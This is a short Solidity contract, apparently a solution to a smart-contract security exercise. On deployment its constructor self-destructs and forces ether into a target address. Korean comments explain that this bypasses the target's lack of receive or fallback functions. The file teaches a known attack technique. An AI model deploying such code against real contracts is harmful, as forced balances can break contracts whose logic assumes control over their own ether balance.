// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

// selfdestruct (^0.8.0) / suicide (0.8.0 이전) : 컨트랙트를 파괴(코드를 블록체인에서 제거)하고 남은 balance 를 지정된 주소로 전송
// receive() / fallback() 함수가 없이 ether 를 전송할 수 있다